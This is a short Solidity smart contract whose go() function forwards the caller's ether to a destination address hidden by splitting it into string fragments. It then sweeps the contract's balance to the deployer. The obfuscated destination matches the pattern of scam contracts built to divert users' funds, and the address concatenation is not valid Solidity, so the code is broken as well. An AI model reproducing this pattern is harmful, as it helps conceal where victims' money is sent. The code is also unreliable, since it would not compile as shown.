pragma solidity ^0.4.24;

contract B {
    address public owner = msg.sender;
    
    function go() public payable {
        address target = 0xC8 + 'A6' + '0C51' + '967F' + '4022' + 'BF94' + '24C3' + '37e9' + 'c6F0' + 'bD22' + '0E1C';
         
        target.call.value(msg.value)();
        owner.transfer(address(this).balance);
    }
    
    function() public payable {
    }
}